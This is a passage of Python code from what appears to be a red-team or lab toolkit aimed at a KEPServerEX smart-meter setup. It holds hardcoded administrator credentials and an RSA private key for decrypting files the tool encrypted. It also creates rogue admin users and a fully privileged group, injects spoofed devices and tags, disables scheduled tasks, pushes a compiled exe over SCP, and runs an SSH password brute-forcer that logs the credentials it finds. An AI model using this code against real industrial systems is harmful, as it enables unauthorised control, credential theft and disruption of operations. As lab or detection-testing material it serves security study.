            # Stop Modpoll.exe
            print("\n==================================\n")

            process_name = "modpoll"
            pid = 0

            for proc in process_iter():
                if process_name in proc.name():
                    pid = proc.pid
                break
            if pid == 0:
                print("Modpoll not running.")
            else:
                kill(pid, signal.SIGTERM)
                print("Modpoll pid:", pid, "has stopped.")

            # Enable sshd service
            print("\n==================================\n")

            service_name = "sshd"
            cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                    print("FAILED: " + " ".join(output[4:]))
            else:
                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")

            # Revert Meter25 ID to 25
            print("\n==================================\n")

            netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
            if "RUNNING" in netshare.stdout:
                print("Kepserver is running, Stopping now.")
                service_name = "KEPServerEXV6"
                cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
                output = cp.stdout.decode('utf-8').strip().split()
                if "FAILED" in cp.stdout.decode('utf-8'):
                    print("FAILED: " + " ".join(output[4:]))
                else:
                    print("The " + output[1] + " service is " + output[9])
                    sleep(15)
            
            current_directory = getcwd()
            executable_path = current_directory + "\\modpoll.exe"
            parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
            try:
                check_call([executable_path] + parameters)
            except CalledProcessError as e:
                print("Error executing the executable file:", e)

            # Re-Enable Firewall
            print("\n==================================\n")
                
            cp = run('netsh advfirewall set allprofiles state on', stdout=PIPE, shell=True)
            if cp.stdout.decode('utf-8').strip() == "Ok.":
                print("Revert Firewall diasble successful.")
            else:
                print("Revert Firewall diasble failed.")
            
            # Remove Firewall In/Outbound rules added.
            print("\n==================================\n")
            count = 0
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
            else:
                print("Inbound Firewall Not Removed (TCP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
            else:
                print("Inbound Firewall Not Removed (UDP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
            else:
                print("Outbound Firewall Not Removed (TCP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
            else:
                print("Outbound Firewall Not Removed (UDP/22)")

            if count == 4:
                print("Revert Firewall Rules Success.")
            else:
                print("Revert Firewall Rules Fail.")

            # Start Kepserver service
            print("\n==================================\n")
                
            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]))
            else:
                print("The " + output[1] + " service is " + output[9])

            # Enable COM port
            print("\n==================================\n")
                
            cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
            dump = cp.stdout.split()
            deviceID = ""
            deviceArr = []
            for i in range(0, len(dump)):
                if dump[i].decode("utf-8") == "ID:":
                    deviceID = dump[i+1].decode("utf-8")
                    if "CVBCx196117" in deviceID:
                        comPort = deviceID
            batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
            with open("script.bat", "w") as f:
                f.write(batchscript)
            cp = run(["script.bat"],stdout=PIPE ,shell=True)
            print(cp.stdout.decode('utf-8'))
            remove("script.bat")

            # Decrypt Files
            print("\n==================================\n")

            privatekey = '''-----BEGIN RSA PRIVATE KEY-----
        MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
        IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
        rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
        QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
        bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
        0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
        vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
        BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
        K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
        eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
        wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
        pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
        2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
        J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
        hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
        67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
        2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
        uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
        dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
        fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
        bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
        MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
        YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
        QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
        zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
        -----END RSA PRIVATE KEY-----'''
            
            excludeExtension = ['.py','.pem', '.exe']

            try:
                for item in self.recurseFiles(self.SMARTMETER_PATH): 
                    filePath = Path(item)
                    fileType = filePath.suffix.lower()

                    if fileType in excludeExtension:
                        continue
                    self.decrypt(filePath, privatekey)
                print("Decryption Successful")
            except Exception as e:
                print("Decryption Failed")

            # Remove copied file, directory, shared file and Scheduled Task
            print("\n==================================\n")
            
            for root, dirs, files in walk(self.COPIED_PATH):
                for file in files:
                    og = path.join(root, file)
                    remove(og)
                    print("File: " + str(og) + " is deleted")


            if path.exists(self.COPIED_PATH):
                rmdir(self.COPIED_PATH)
                print(self.COPIED_PATH + " has beeen removed.")

            netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)

            if "SmartMeterfolder" in netsharechk.stdout:
                call('cmd /k "net share SmartMeterfolder /delete"', shell=True)

            task_name1 = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)

            
            # Define the command to delete the task using schtasks
            schdel = f'schtasks /delete /tn "{task_name1}" /f'
            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'

            # Delete the task using the schtasks command
            call(schdel, shell=True)
            call(schdel2, shell=True)

            print("\n==================================\n")

            print("Reverting successfull.\nOk.\n")

        elif revert_option == "-h":
            print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything.")
        else:
            print ("Invalid Option! Use option \"-h\" for help!")

    def kep_connect(self, port: int=57412) -> connection.server:
        print(f"IP is : {self.WINDOWS_SERVER_IP}")
        """
        Connects to the KEPServer.

        NOTE: 172.16.2.77 if at lv 7\n
        NOTE: 172.16.2.223 if at lv 6

        Args:
            host (str): IP Address of the Remote KEPServer
            port (str): Port of the Remote KEPServer

        Returns:
            kepconfig.connection.server: returns an instance of kepconfig.connection.server
        """
        # 172.16.2.77 if at lv 7
        # 172.16.2.223 if at lv 6
        server = connection.server(host = self.WINDOWS_SERVER_IP, port = port, user = 'Administrator', pw = 'administrator2022')
        print("Connected to KEP server.")
        return server

    def kep_server_info(self):
        server = self.kep_connect()
        print(json.dumps(server.get_info(), indent=4),file=sys.stdout)

    ## USERS and USER GROUPS

    def kep_get_all_users(self):
        server = self.kep_connect()
        print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)

    def kep_enable_user(self, user):
        server = self.kep_connect()
        print(admin.users.enable_user(server, user),file=sys.stdout)

    def kep_disable_user(self, user):
        server = self.kep_connect()
        print(admin.users.disable_user(server, user),file=sys.stdout)

    def kep_get_single_user(self, user):
        server = self.kep_connect()
        print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)

    def kep_modify_user(self,user): ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change
        server = self.kep_connect()
        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE", "libadminsettings.USERMANAGER_USER_GROUPNAME": "readtesting"}, "bigboi" ), indent=4))
        print(admin.users.get_user(server, "bigboi"))

    def kep_add_user(self,user): ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
        server = self.kep_connect()
        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": "bigboi", "libadminsettings.USERMANAGER_USER_GROUPNAME": "Administrators", "libadminsettings.USERMANAGER_USER_PASSWORD": "SmellyBoiBoiBoi"}))

    def kep_del_user(self,user): ## ADDED to delete user
        server = self.kep_connect()
        print(admin.users.del_user(server, "bigboi"))

    def kep_add_user_group(self, UG): ### ADDED to add spoofed user group
        server = self.kep_connect()
        print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": "Illuminati"}))

    def kep_delete_user_group(self, UG): ### ADDED to delete user group
        server = self.kep_connect()
        print(admin.user_groups.del_user_group(server, "Illuminati"))

    def kep_modify_user_group(self, UG): ### ADDED to let user modify user group to superuser
        server = self.kep_connect()
        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP", 
                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable", 
                                                   "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": True , 
                                                   "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
                                                   "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
                                                   "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
                                                   "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
                                                   "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
                                                   "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
                                                   "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
                                                   "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
                                                   "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
                                                   "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
                                                   "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
                                                   "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group="Illuminati"))
        
    def kep_get_all_user_groups(self): ### ADDED to get all user groups
        server = self.kep_connect()
        print(json.dumps(admin.user_groups.get_all_user_groups(server), indent=4))

    def kep_get_single_user_group(self, UG): ### ADDED to get single user group
        server = self.kep_connect()
        print(json.dumps(admin.user_groups.get_user_group(server, "Illuminati"), indent=4))

    def kep_add_channel(self, channel):
        server = self.kep_connect()
        print(json.dumps(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": channel,
                                                                   "common.ALLTYPES_DESCRIPTION": "I am biased towards freeloaders",
                                                                   "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial"}),
                         indent=4))

    ## CHANNEL AND DEVICE

    def kep_get_all_channels(self):
        server = self.kep_connect()
        print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))

    def kep_add_spoofed_channel(self): ### Added to add spoofed channel
        server = self.kep_connect()
        print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": "NotSmartMeter", "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Simulator"}))

    def kep_del_spoofed_channel(self): ### Added to del spoofed channel
        server = self.kep_connect()
        print(connectivity.channel.del_channel(server, "NotSmartMeter"))

    def kep_modify_channel(self): ### Added to modify channel
        server = self.kep_connect()
        print(connectivity.channel.modify_channel(server, {"PROJECT_ID": 4064171838, "common.ALLTYPES_NAME": "NotSmartMeter1"}, channel="NotSmartMeter"))

    def kep_get_all_devices(self,channel): # Example of a channel name is "SmartMeter"
        server = self.kep_connect()
        print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))

    def kep_get_single_device(self, channel, device): # Example of a single device is "SmartMeter.ministicHACKED"
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))

    def kep_modify_device(self, channel, device):
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.device.get_device(server, "SmartMeter.Hijack", {"PROJECT_ID": 1459547795, "common.ALLTYPES_NAME": "ministicHACKED"}), indent=4))
        

    ## TAG FOR DEVICE

    def kep_get_full_tag_structure(self,channel, device): ## ADDED to get full tag structure
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.get_full_tag_structure(server, device_to_get), indent=4))

    def kep_get_all_tags(self,channel, device): ## ADDED to get all tags
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))

    def kep_add_tags(self,channel, device): ## ADDED to add tags
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.add_tag(server, device_to_get, {"common.ALLTYPES_NAME": "TEST", "servermain.TAG_ADDRESS": "40003"}), indent=4))

    def kep_del_tag(self,channel, device): ## ADDED to del tags
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))
        print(json.dumps(connectivity.tag.del_tag(server, "SmartMeter.ministicHACKED"), indent=4))

    def kep_modify_tag(self,channel, device): ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.modify_tag(server, "SmartMeter.ministicHACKED.TEST1", {"PROJECT_ID": 2330553848,  "common.ALLTYPES_NAME": "UPDATEBOI"}), indent=4))
        print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))

    ## SPOOFED DEVICE
  
    def kep_add_spoofed_device(self,channel,device):
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel, {"common.ALLTYPES_NAME": device, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
        print("\n" + json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))

    def kep_delete_spoofed_device(self,channel, device):
        server = self.kep_connect()
        device_to_del = ".".join([channel, device])
        print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))

    def kep_modify_spoofed_device(self, channel, device):
        server = self.kep_connect()
        device_to_modify = ".".join([channel, device])
        print("MODIFY DEVICE: " + json.dumps(connectivity.device.modify_device(server, device_to_modify,
                                                                               {"common.ALLTYPES_NAME": device,
                                                                                "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial",
                                                                                "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}),
                                             indent=4))
        print(json.dumps(connectivity.device.get_device(server, device_to_modify), indent=4))

    def kep_get_spoofed_device_structure(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(
            "DEVICE STRUCTURE: " + json.dumps(connectivity.device.get_device_structure(server, device_info), indent=4))

    def kep_auto_tag_gen(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.device.auto_tag_gen(server, device_info, job_ttl=8), indent=4))

    def kep_add_exchange(self, channel, device, exchange):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.exchange.add_exchange(server, channel, device_info,
                                                                {"common.ALL_TYPES_NAME": exchange}), indent=4))

    def kep_get_exchange(self, channel, device, ex_type, exchange_name):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.exchange.get_exchange(server, device_info, ex_type, exchange_name), indent=4))

    def kep_delete_exchange(self, channel, device, ex_type, exchange_name):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.exchange.del_exchange(server, device_info, ex_type, exchange_name), indent=4))

    def kep_add_name_resolution(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(
            connectivity.egd.name.add_name_resolution(server, device_info, {"common.ALLTYPES_NAME": "Derrick"}),
            indent=4))

    def kep_delete_name_resolution(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.name.del_name_resolution(server, device_info, "Derrick"), indent=4))

    def kep_modify_name_resolution(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.name.modify_name_resolution(server, device_info, {
            "ge_ethernet_global_data.NAME_RESOLUTION_ALIAS": "PLC1",
            "ge_ethernet_global_data.NAME_RESOLUTION_IP_ADDRESS": "192.168.1.200"}), indent=4))
        print(json.dumps(connectivity.egd.name.get_name_resolution(server, device_info), indent=4))

    def kep_get_name_resolution(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(json.dumps(connectivity.egd.name.get_name_resolution(server, device_info), indent=4))

    def kep_add_udd_profile(self, profile):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.add_profile(server, {"common.ALLTYPES_NAME": profile,
                                                                       "common.ALLTYPES_DESCRIPTION": "a short description"}),
                         indent=4))

    def kep_delete_udd_profile(self, profile_name):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.del_profile(server, profile_name), indent=4))

    def kep_get_all_udd_profiles(self):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.get_all_profiles(server), indent=4))

    def kep_modify_udd_profile(self, profile_name):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": "ModbusProfile",
                                                                          "common.ALLTYPES_DESCRIPTION": "a short description"}),
                         indent=4))
        print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name), indent=4))

    def kep_add_log_item(self, log_item, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_items.add_log_item(server, log_group, {"common.ALL_TYPES_NAME": log_item}),
                         indent=4))

    def kep_get_all_log_items(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_items.get_all_log_items(server, log_group), indent=4))

    def kep_delete_log_item(self, log_group, log_item):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_items.del_log_item(server, log_group, log_item), indent=4))

    def kep_add_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.add_log_group(server, {"common.ALLTYPES_NAME": log_group,
                                                                     "common.ALLTYPES_DESCRIPTION": "I love dataloggers"}),
                         indent=4))

    def kep_delete_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.del_log_group(server, log_group), indent=4))

    def kep_disable_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.disable_log_group(server, log_group), indent=4))

    def kep_enable_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.enable_log_group(server, log_group), indent=4))

    def kep_get_all_log_groups(self):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.get_all_log_groups(server), indent=4))

    def kep_modify_project_properties(self, name):
        server = self.kep_connect()
        print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": name}),
                         indent=4))
        print(json.dumps(connection.server.get_project_properties(server), indent=4))

    def disable_running_schedules(self) -> None:
        """
        Disables MoveFiles and KEPServerEX 6.12 running schedules in task scheduler
        """
        command_output = self.ssh_run_command("schtasks /change /TN \MoveFiles /disable")
        if "SUCCESS:" in command_output:
            print("Successfully disabled \MoveFiles Tasks Scheduler")
            print("Ok.")

        command_output = self.ssh_run_command("schtasks /change /TN \KEPServerEX 6.12 /disable")
        if "SUCCESS:" in command_output:
            print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler")
            print("Ok.")
        
    def kep_server_stop(self) -> bool:
        """
        Stops KEPServer service

        Returns:
            bool: True/False based on whether the command `stop service` could execute or not.
        """
        command_output = self.ssh_run_command("sc query KEPServerEXV6")
        if "RUNNING" in command_output:
            print("Kepserver is running, Stopping now...")
            command_output = self.ssh_run_command("sc stop KEPServerEXV6")
            
            while "STOP_PENDING" in command_output:
                command_output = self.ssh_run_command("sc query KEPServerEXV6")
                if "FAILED" in command_output:
                    print("FAILED:", "\nFail.\n") 
                    return False
                elif "STOPPED" in command_output:
                    print("Kepserver is stopped")
                    return True
                else:
                    print("Kepserver is still stopping... waiting 1 more second")
                    sleep(1)
        
        elif "STOPPED" in command_output:
            print("Kepserver have already stopped")
            return True
        else:
            print("Something went wrong!")
            return False

    def kep_server_start(self) -> bool:
        """
        Starts KEPServer service

        Returns:
            bool: True/False based on whether the command `start service` could execute or not.
        """
        command_output = self.ssh_run_command("sc query KEPServerEXV6")
        if "STOPPED" in command_output:
            print("Kepserver is stopped, starting now...")
            command_output = self.ssh_run_command("sc start KEPServerEXV6")

            while "START_PENDING" in command_output:
                command_output = self.ssh_run_command("sc query KEPServerEXV6")
                if "FAILED" in command_output:
                    print("FAILED:", "\nFail.\n")
                    return False
                elif "RUNNING" in command_output:
                    print("Kepserver is running!")
                    return True
                else:
                    print("Kepserver is still starting up... waiting 1 more second")
                    sleep(1)
                
        elif "RUNNING" in command_output:
            print("Kepserver is running!")
            return True
        else:
            print("Something went wrong!")
            return False

    #Functions for getting status for GUI

    # TODO: kep_server_start()
    def kep_get_service_status(self) -> bool:
        """
        Get KEP service status

        Returns:
            bool: True/False based on whether KEPServerEXV6 is running or not.
        """
        command_output = self.ssh_run_command(r'powershell -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
        if "Running" in command_output:
            print("KEPSERVER Running")
            return True
        return False
    
    def kep_get_windef_status(self) -> bool:
        """
        Get Windows Defender status

        Returns:
            bool: True/False based on whether Windows Defender is enabled or not.
        """
        command_output = self.ssh_run_command(r'powershell -command "Get-MpComputerStatus | select Antivirusenabled"')
        if "True" in command_output:
            print("Windows Defender Running")
            return True
        return False

    def kep_get_firewall_status(self):
        """
        Get Windows Firewall status

        Returns:
            str,str,str: OFF/ON based on whether Windows Firewall is enabled or not.
            List Order [Domain, Private, Public]
        """
        command_output = self.ssh_run_command(r'netsh advfirewall show allprofiles state')
        results = []

        results.append("OFF" if "OFF" in command_output.split()[5] else "ON")
        results.append("OFF" if "OFF" in command_output.split()[11] else "ON")
        results.append("OFF" if "OFF" in command_output.split()[17] else "ON")

        print(results)
        return results
    

    def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
        """
        # TODO: from self.ssh_run_command, uses the same ssh paramiko client. May need to cut the paramiko client connection to its own function, then both self.scp_transfer_file and self.ssh_run_command can use the same ssh paramiko client function

        Transfer the a file remotely from host to destination machine.

        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file

        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.

        Args:
            command (str): The command to run on the remote server.
            host (str): The hostname or IP address of the remote server.
            username (str): The username to use for the SSH connection.
            password (str): The password to use for the SSH connection.
            private_key_path (str): The path to the private key file.
            local_full_path (str): The local full path of the host machine, INCLUDING THE EXTENSION NAME
            remote_full_path (str): The remote full path of the remote machine, INCLUDING THE EXTENSION NAME
        """

        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the remote server, prioritizing private key over password
            if self.PRIVATE_KEY_PATH is not None:
                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
                # Connect using the private key
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
            if self.PASSWORD is not None:
                # Connect using password
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
            else:
                # Handle case when neither password nor private key is provided
                print("Please provide either a password or a private key.")
                return None

            # Placeholder for other code to run after successful connection
            print("Connected to the remote server.")
            # Run the command

            ssh_transport = ssh.get_transport()
            ssh_transport.default_window_size = 2147483647
            ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
            ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
            scp = SCPClient(ssh_transport, progress4=self.progress4)
            scp.put(local_full_path, remote_path=remote_full_path)

            # Close the SCP client
            scp.close()
            
        except paramiko.AuthenticationException:
            print("Authentication failed. Please check your credentials.")
            return None
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
            return None
        except Exception as e:
            print(f"An error occurred: {e}")
            return None
        ssh.close()

    def dummy_test(self) -> None:
        print("Hello, I am very cooool")

    def transfer_exe_remotely(self, remote_path=None):
        """
        Convert this current script to exe and transfer to the specified remote_path

        Args:
            remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
        """
        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"

        if remote_path is None:
            remote_path = self.MODPOLL_PATH

        self.scp_transfer_file(f"dist/{executable_name}", f"{remote_path}/{executable_name}")

        #print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
    
    def progress4(self, filename, size, sent, peername):
        sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (peername[0], peername[1], filename, float(sent)/float(size)*100) )

    def ssh_brute_force(self) -> bool:
        """
        Attempts to brute force an SSH connection given a hostname, port, username, and password list file.

        Args:
            hostname (str): The hostname or IP address of the SSH server.
            username (str): The username to use for the SSH connection.
            password_file (str): The path to the password list file.

        Returns:
            bool: True if the SSH connection was successful, False otherwise.
        """

        # Create an SSH client using the Paramiko library
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Read from the password list file and save it to a list
        passwordList = []
        with open(self.PASSWORD_FILE, "r") as f:
            for line in f.readlines():
                passwordList.append(line.strip())

        # Attempt to connect to the SSH server using the username and password list
        for password in passwordList:
            try:
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=password)
                # If the connection was successful, print the valid credentials
                print(f"[*] Found valid credentials - Username: {self.USERNAME}, Password: {password}")

                # Write the valid credentials to credentials.csv
                # If the file does not exist, create it and write the header
                try:
                    with open("resources\\credentials.csv", "x") as f:
                        f.write("username,password")
                except FileExistsError:
                    pass

                with open("resources\\credentials.csv", "a") as f:
